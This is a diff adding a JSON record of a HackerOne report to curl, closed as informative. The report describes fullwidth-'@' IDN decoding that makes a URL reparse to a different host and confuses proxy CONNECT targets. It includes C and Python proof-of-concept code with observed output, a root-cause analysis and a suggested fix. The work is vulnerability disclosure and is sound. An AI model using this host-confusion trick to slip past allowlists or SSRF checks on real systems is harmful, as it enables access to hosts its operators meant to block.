@@ -1,0 +1,116 @@
+{
+  "id": 4129950,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTI5OTUw",
+  "url": "https://hackerone.com/reports/4129950",
+  "title": "IDN decoding inserts authority delimiters and can redirect proxy CONNECT to a different host",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2026-10-20T03:12:29.113Z",
+  "submitted_at": "2026-10-20T18:52:26.824Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zefanxu",
+    "url": "/zefanxu",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2016-8625",
+    "CVE-2022-42916"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-21T21:34:54.462Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-21T17:25:27.618Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "IDN decoding can insert authority delimiters: CURLU_PUNYCODE output does not\n\nround-trip and proxy requests carry an ambiguous authority\n\n## Summary\n\nlibcurl's IDN decoder accepts a hostname containing U+FF20 FULLWIDTH COMMERCIAL\n\nAT (`＠`). libidn2's TR46 transitional fallback converts it to ASCII `@`.\n\n`Curl_idn_decode()` only checks that the result is non-empty, so the decoded\n\nhost can contain characters that the URL parser itself treats as authority\n\ndelimiters.\n\nConsequences:\n\n1. `curl_url_get(..., CURLU_PUNYCODE)` returns a URL that reparses to a\n    \n    different host and userinfo.\n    \n2. Through an HTTP proxy, curl sends the decoded host in the request target.\n    \n    A proxy using generic URL/authority parsing sees a different host than the\n    \n    URL's apparent host.\n    \n3. The non-tunneling proxy path fails with `CURLE_OUT_OF_MEMORY` because the\n    \n    decoded host cannot be stored with `CURLUPART_HOST`.\n    \n\nThis is an internal round-trip inconsistency in libcurl, not merely a\n\nbrowser-versus-curl disagreement.\n\n## Tested versions\n\n- curl 8.23.0, built with libidn2 2.2.0\n- curl master `eb2b201a2` (`8.23.1-DEV`), built with libidn2 2.2.0\n- System curl 7.68.0 with libidn2 2.2.0 also emitted the proxy request with\n    \n    the decoded ASCII `@`\n    \n\n## Root cause\n\n- `lib/idn.c:314` `Curl_idn_decode()` only rejects an empty result at\n    \n    `lib/idn.c:329`.\n    \n- `lib/peer.c:215` stores the decoded host directly.\n- `lib/urlapi.c:1638` concatenates the decoded host into the serialized URL.\n- `lib/http_proxy.c:213` builds the CONNECT authority from the decoded host.\n\nThe URL parser already has an `invalid_host_char` table at\n\n`lib/urlapi.c:446` that rejects `@`, `/`, `:`, `?`, `#`, `[`, `]`, and other\n\ndelimiters. The decoder does not apply that validation to its output.\n\n## Reproduction\n\nThe probes are in this directory:\n\n- `idn_url_probe.c`\n- `idn_proxy_poc.py`\n\n### URL API round trip\n\nBuild `audit/idn_url_probe.c` against libcurl with libidn2 and run it.\n\nThe process must call `setlocale(LC_ALL, \"\")` so libidn2's locale-dependent\n\n`idn2_lookup_ul()` sees UTF-8.\n\nObserved on 8.23.0 and master:\n\n```\nset-url: 0 (No error)\nhost: 0 [trusted.example＠evil.example]\npunycode-host: 0 [trusted.example@evil.example]\npunycode-host-as-host: 21 (Bad hostname)\npunycode-url: 0 [https://trusted.example@evil.example/x]\nreparse: 0 (No error)\nreparsed-host: [evil.example]\nreparsed-user: [trusted.example]\n```\n\n### Proxy wire behavior\n\nRun `audit/idn_proxy_poc.py` with an IDN-enabled curl binary.\n\nObserved on 8.23.0 and master:\n\n```\ntunnel=True\nrequest-line: CONNECT trusted.example@evil.example:80 HTTP/1.1\nHost: trusted.example@evil.example:80\nparsed-host: evil.example\nparsed-user: trusted.example\n```\n\nPython's `urllib.parse.urlsplit()` interprets the absolute-form target as\n\nhost `evil.example` with username `trusted.example`, which is the standard\n\ngeneric-authority interpretation.\n\nObserved on curl 7.68.0, the non-tunneling request is:\n\n```\nGET http://trusted.example@evil.example/x HTTP/1.1\nHost: trusted.example@evil.example\n```\n\nOn 8.23.0 and master, the same non-tunneling request currently fails with\n\n`CURLE_OUT_OF_MEMORY` before reaching the proxy.\n\n## Suggested fix\n\nAfter IDN decoding, validate the result with the same hostname syntax rules\n\nused by the URL parser, at minimum rejecting ASCII `@`, `/`, `:`, `?`, `#`,\n\n`[`, `]`, and `\\`. Reject the conversion with `CURLE_URL_MALFORMAT` rather\n\nthan returning an invalid host.\n\nAdd regression tests that:\n\n- assert `curl_url_get(CURLUPART_URL, CURLU_PUNYCODE)` reparses to the same\n    \n    scheme, host, port, and userinfo;\n    \n- cover U+FF20, U+FF0F, U+FF1A, U+FF1B, U+FF1F, U+FF03, U+FF3B, U+FF3D,\n    \n    and U+FF3C;\n    \n- exercise both proxy CONNECT and non-tunneling absolute-form requests.\n\n## C PoC\n\nFile: `idn_url_probe.c`\n\n```c\n#include <curl/curl.h>\n#include <locale.h>\n#include <stdio.h>\n\nstatic void free_part(char **p)\n{\n  if(*p) {\n    curl_free(*p);\n    *p = NULL;\n  }\n}\n\nint main(void)\n{\n  /* U+FF20 FULLWIDTH COMMERCIAL AT, encoded as UTF-8. */\n  const char *input = \"https://trusted.example\\xef\\xbc\\xa0\"\n                      \"evil.example/x\";\n  CURLU *u = NULL;\n  CURLU *v = NULL;\n  CURLU *w = NULL;\n  char *host = NULL;\n  char *phost = NULL;\n  char *purl = NULL;\n  char *rhost = NULL;\n  char *ruser = NULL;\n  CURLUcode rc;\n\n  setlocale(LC_ALL, \"\");\n  curl_global_init(CURL_GLOBAL_DEFAULT);\n  u = curl_url();\n  v = curl_url();\n  w = curl_url();\n  if(!u || !v || !w)\n    return 2;\n\n  rc = curl_url_set(u, CURLUPART_URL, input, 0);\n  printf(\"set-url: %d (%s)\\n\", (int)rc, curl_url_strerror(rc));\n  if(rc)\n    goto out;\n\n  rc = curl_url_get(u, CURLUPART_HOST, &host, 0);\n  printf(\"host: %d [%s]\\n\", (int)rc, host ? host : \"(null)\");\n  rc = curl_url_get(u, CURLUPART_HOST, &phost, CURLU_PUNYCODE);\n  printf(\"punycode-host: %d [%s]\\n\", (int)rc, phost ? phost : \"(null)\");\n  if(phost) {\n    rc = curl_url_set(w, CURLUPART_HOST, phost, 0);\n    printf(\"punycode-host-as-host: %d (%s)\\n\",\n           (int)rc, curl_url_strerror(rc));\n  }\n  rc = curl_url_get(u, CURLUPART_URL, &purl, CURLU_PUNYCODE);\n  printf(\"punycode-url: %d [%s]\\n\", (int)rc, purl ? purl : \"(null)\");\n\n  if(purl) {\n    rc = curl_url_set(v, CURLUPART_URL, purl, 0);\n    printf(\"reparse: %d (%s)\\n\", (int)rc, curl_url_strerror(rc));\n    if(!rc) {\n      curl_url_get(v, CURLUPART_HOST, &rhost, 0);\n      curl_url_get(v, CURLUPART_USER, &ruser, 0);\n      printf(\"reparsed-host: [%s]\\n\", rhost ? rhost : \"(null)\");\n      printf(\"reparsed-user: [%s]\\n\", ruser ? ruser : \"(null)\");\n    }\n  }\n\nout:\n  free_part(&host);\n  free_part(&phost);\n  free_part(&purl);\n  free_part(&rhost);\n  free_part(&ruser);\n  curl_url_cleanup(v);\n  curl_url_cleanup(w);\n  curl_url_cleanup(u);\n  curl_global_cleanup();\n  return 0;\n}\n```\n\n## Python PoC\n\nFile: `idn_proxy_poc.py`\n\n```python\n#!/usr/bin/env python3\nimport socket\nimport subprocess\nimport sys\nimport threading\nimport time\nfrom urllib.parse import urlsplit\n\ndef run_one(curl, tunnel):\n    result = {}\n\n    def proxy():\n        listener = socket.socket()\n        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        listener.bind((\"127.0.0.1\", 0))\n        listener.listen(1)\n        listener.settimeout(5)\n        result[\"port\"] = listener.getsockname()[1]\n        try:\n            conn, _ = listener.accept()\n            conn.settimeout(3)\n            data = b\"\"\n            while b\"\\r\\n\\r\\n\" not in data:\n                chunk = conn.recv(4096)\n                if not chunk:\n                    break\n                data += chunk\n            result[\"request\"] = data\n            conn.close()\n        except Exception as exc:\n            result[\"error\"] = repr(exc)\n        listener.close()\n\n    thread = threading.Thread(target=proxy)\n    thread.daemon = True\n    thread.start()\n    while \"port\" not in result and \"error\" not in result:\n        time.sleep(0.01)\n\n    url = \"http://trusted.example\\uff20evil.example/x\"\n    cmd = [curl, \"-sS\", \"-m\", \"2\", \"-x\",\n           \"http://127.0.0.1:%d\" % result[\"port\"]]\n    if tunnel:\n        cmd.append(\"--proxytunnel\")\n    cmd.append(url)\n    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    thread.join(timeout=2)\n\n    request = result.get(\"request\", b\"\")\n    first = request.split(b\"\\r\\n\")[0].decode(\"utf-8\", \"replace\")\n    print(\"tunnel=%s rc=%d\" % (tunnel, proc.returncode))\n    print(\"request-line: %s\" % first)\n    if tunnel and first.startswith(\"CONNECT \"):\n        parsed = urlsplit(\"//\" + first.split(\" \", 2)[1])\n    elif not tunnel and first.startswith(\"GET \"):\n        parsed = urlsplit(first.split(\" \", 2)[1])\n    else:\n        parsed = None\n    if parsed:\n        print(\"parsed-host: %s\" % parsed.hostname)\n        print(\"parsed-user: %s\" % parsed.username)\n    print()\n\ndef main():\n    curl = sys.argv[1] if len(sys.argv) > 1 else \"./build-asan/src/curl\"\n    print(\"curl=%s\\n\" % curl)\n    run_one(curl, True)\n    run_one(curl, False)\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## Reproduction commands\n\nBuild the C probe against an IDN-enabled libcurl build, then run:\n\n```bash\n./audit/idn_url_probe_master\nASAN_OPTIONS=detect_leaks=0 python3 audit/idn_proxy_poc.py ./curl-master-as/src/curl\n```\n\nObserved URL API result:\n\n```\nhost: trusted.example＠evil.example\npunycode-host: trusted.example@evil.example\npunycode-host-as-host: 21 (Bad hostname)\npunycode-url: https://trusted.example@evil.example/x\nreparsed-host: evil.example\nreparsed-user: trusted.example\n```\n\nObserved proxy request:\n\n```\nCONNECT trusted.example@127.0.0.1:8080 HTTP/1.1\nHost: trusted.example@127.0.0.1:8080\n```\n\ntinyproxy 1.10 `extract_url()` calls `strip_username_password()`, which removes everything through the first `@`, so tinyproxy connects to `127.0.0.1:8080`.\n\n## Impact\n\n## Impact\n\n- A host allowlist, redirect filter, URL cache, or SSRF check using\n    \n    `CURLU_PUNYCODE` as the canonical form can be bypassed because the output\n    \n    reparses to a different origin.\n    \n- In proxy environments, a proxy that accepts userinfo in an absolute-form\n    \n    request or CONNECT authority can be induced to connect to the attacker's\n    \n    host while the user-visible URL appears to start with `trusted.example`.\n    \n- The non-tunneling path returns `CURLE_OUT_OF_MEMORY`, which is a\n    \n    request-level availability failure.\n    \n\nThe impact requires an application that accepts the URL and a proxy that\n\nparses the resulting authority permissively. That dependency is why this\n\nshould be rated Medium rather than High.\n\nThe application cannot reasonably reject the dangerous input by inspecting\n\nthe raw hostname: `curl_url_set()` accepts it, and the ASCII `@` only appears\n\nafter libcurl's own IDN conversion. The breakage is in libcurl's normalized\n\noutput, not in a separate browser parser.\n\n## Why this is not a duplicate of older IDN advisories\n\n- CVE-2016-8625 covered IDNA 2003 versus IDNA 2008 selecting a different\n    \n    valid hostname.\n    \n- CVE-2022-42916 covered an HSTS bypass using IDN characters that map to an\n    \n    ASCII dot.\n    \n- This report covers the decoder producing authority delimiters that make\n    \n    libcurl's own `CURLU_PUNYCODE` output non-round-trippable and make proxy\n    \n    requests ambiguous. The older HSTS-specific check does not cover this path.\n    \n\nThe precedent for accepting this class is CVE-2022-42916, which was rated\n\nMedium for an IDN character mapping to an ASCII authority separator. This\n\nreport has the same class of normalization mismatch plus a direct proxy\n\nrequest impact.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "samir_xp"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
